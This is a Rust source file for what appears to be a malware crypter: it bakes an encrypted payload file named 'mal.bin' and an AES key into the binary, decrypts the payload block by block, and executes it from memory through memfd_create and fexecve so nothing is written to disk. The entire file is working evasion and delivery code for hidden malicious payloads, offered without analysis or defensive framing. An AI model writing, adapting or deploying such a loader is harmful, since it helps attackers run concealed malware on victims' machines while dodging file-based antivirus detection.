use aes::{
    cipher::{generic_array::GenericArray, BlockDecrypt, KeyInit},
    Aes128,
};
use nix::{
    sys::memfd::{memfd_create, MemFdCreateFlag},
    unistd,
    unistd::fexecve,
};
use std::{ffi::CString, os::fd::AsRawFd};

// inspiré de https://github.com/Amaop/Rust-Crypter/ et de https://github.com/dustyw0lf/linc

const BLOCK_SIZE: usize = 16; //aes block size

fn main() {
    /* Include (at compile time) the content of the files "mal.bin" and "key" into the binary*/
    let enc_bytes = include_bytes!("mal.bin");
    let key = include_bytes!("key");
    assert_eq!(key.len(), 16);

    let mal = decrypt(enc_bytes, key, BLOCK_SIZE);

    fileless_exec(mal)
}

fn fileless_exec(payload: Vec<u8>) {
    let empty = CString::new("").unwrap();
    let p_filename = empty.as_c_str();

    let fd = memfd_create(p_filename, MemFdCreateFlag::MFD_CLOEXEC).unwrap();

    unistd::write(&fd, &payload).unwrap();

    let env = CString::new("").unwrap();
    let arg = CString::new("").unwrap();

    fexecve(fd.as_raw_fd(), &[&arg], &[&env]).unwrap();
}

fn decrypt(bytes: &[u8], key: &[u8; 16], block_size: usize) -> Vec<u8> {
    let key = GenericArray::from(*key);
    let cipher = Aes128::new(&key);

    let mut decrypted = Vec::new();
    for block in bytes.chunks(block_size) {
        let mut block_array = GenericArray::clone_from_slice(block);
        cipher.decrypt_block(&mut block_array);
        decrypted.extend_from_slice(&block_array);
    }

    // Unpad the decrypted bytes
    let padding_size = *decrypted.last().unwrap() as usize;
    decrypted = (decrypted[..decrypted.len() - padding_size]).to_vec();

    decrypted
}
